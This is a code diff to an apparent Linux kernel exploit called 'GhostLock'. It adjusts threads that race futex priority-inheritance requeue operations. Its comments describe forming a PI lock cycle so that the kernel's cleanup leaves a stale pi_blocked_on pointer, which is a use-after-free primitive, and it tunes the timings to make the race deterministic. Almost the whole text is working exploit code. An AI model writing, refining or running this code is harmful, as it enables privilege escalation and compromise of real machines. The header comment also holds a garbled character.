@@ -1,5 +1,5 @@
 /*
- * GhostLock — PI race worker threads and the per-write route entry.
+ * GhostLock 闂?PI race worker threads and the per-write route entry.
  *
  * Split out of main.cpp; the statement order and log text are unchanged.
  */
@@ -45,8 +45,9 @@ namespace ghostlock::race {
             }
         }
         race->waiter_waiting.store(1);
-        support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
-                          &race->target_futex, 0);
+        errno = 0;
+        (void) support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0,
+                                 &timeout, &race->target_futex, 0);
         route::RouteController controller;
         controller.init(race, &session::g_exploit_session.profile);
         race->route_status = controller.execute(request);
@@ -75,6 +76,9 @@ namespace ghostlock::race {
     void *owner_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         support::disable_rseq_for_thread();
+        /* Original design: the owner holds target_futex, the waiter parks with
+         * FUTEX_WAIT_REQUEUE_PI and the requeue fails with EAGAIN; the waiter's
+         * own timeout then wakes it and it runs the route. */
         long lock_target = support::futex_op(
             &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
         if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
@@ -87,11 +91,45 @@ namespace ghostlock::race {
             return nullptr;
         }
         race->owner_started.store(1);
-        support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
+        /* Original chain design: the owner blocks on the chain futex held by
+         * the waiter, forming the PI cycle owner->chain->waiter that makes
+         * task_blocks_on_rt_mutex() return -EDEADLK and rt_mutex_start_proxy_lock()
+         * call remove_waiter() from the requeue thread. */
+        race->trigger_unlock.store(1); /* "about to block on chain" handshake */
+        {
+            struct timespec ct;
+            SYSCHK(clock_gettime(CLOCK_REALTIME, &ct));
+            /* Chain-lock timeout is tunable via execution.stages.w1_settle_us
+             * (microseconds); it must be greater than the requeue settle and
+             * smaller than race_route_wait_ms so the cycle is broken after the
+             * EDEADLK but before the waiter's cleanup. The fast_repair route
+             * runs with a 20 ms waiter timeout and a 5 ms settle, so its chain
+             * timeout has to shrink with it (3 ms). */
+            long chain_ns = static_cast<long>(
+                session::g_exploit_session.profile.w1_settle_us()) * 1000L;
+            if (race->fast_repair.load()) chain_ns = 10000000L; /* 10 ms: after the 5 ms requeue, before the 20 ms cleanup */
+            if (chain_ns <= 0) chain_ns = 100000000L;
+            ct.tv_nsec += chain_ns;
+            if (ct.tv_nsec >= 1000000000L) {
+                ct.tv_sec += ct.tv_nsec / 1000000000L;
+                ct.tv_nsec %= 1000000000L;
+            }
+            errno = 0;
+            long cr = support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, &ct,
+                                        nullptr, 0);
+            pr_info("owner chain timed lock ret=%ld errno=%d\n", cr, errno);
+        }
+        /* Release target before the waiter's 400 ms timeout cleanup runs:
+         * rt_mutex_cleanup_proxy_lock() then takes the lock itself and skips
+         * remove_waiter(), leaving the stale pi_blocked_on in place. */
+        if (lock_target == 0) {
+            errno = 0;
+            (void) support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0,
+                                        nullptr, nullptr, 0);
+            lock_target = -1;
+        }
         race->owner_chain_done.store(1);
         while (!race->owner_stop.load()) sleep(1);
-        if (lock_target == 0)
-            support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
         return nullptr;
     }
 
@@ -99,7 +137,8 @@ namespace ghostlock::race {
         auto *race = static_cast<PiRace *>(arg);
         support::disable_rseq_for_thread();
         kernel::pin_to_core(static_cast<size_t>(race->consumer_cpu));
-        pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
+        pr_info("consumer thread running on cpu=%d race=%p\n", sched_getcpu(),
+                static_cast<void *>(race));
         int32_t seen = 0;
         while (!race->consumer_stop.load()) {
             int32_t seq = race->consumer_go.load();
@@ -175,10 +214,18 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
     while (!waiter_waiting.load() || !owner_started.load())
         usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
     pr_info("[route] waiter parked; owner started\n");
+    /* Wait until the owner is queued on the chain futex before requeueing, so
+     * the PI cycle owner->chain->waiter is formed deterministically and the
+     * requeue always returns -EDEADLK. */
+    while (!trigger_unlock.load() && !owner_stop.load())
+        usleep(1000);
     usleep(fast_repair.load()
                ? 5000
                : session::g_exploit_session.profile.race_setup_settle_us());
     errno = 0;
+    /* The waiter parks on wait_futex; the trigger handshake below tells the
+     * owner to form the PI cycle and later release target. */
+    trigger_unlock.store(1);
     long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                 reinterpret_cast<void *>(1),
                                 &target_futex, 0);
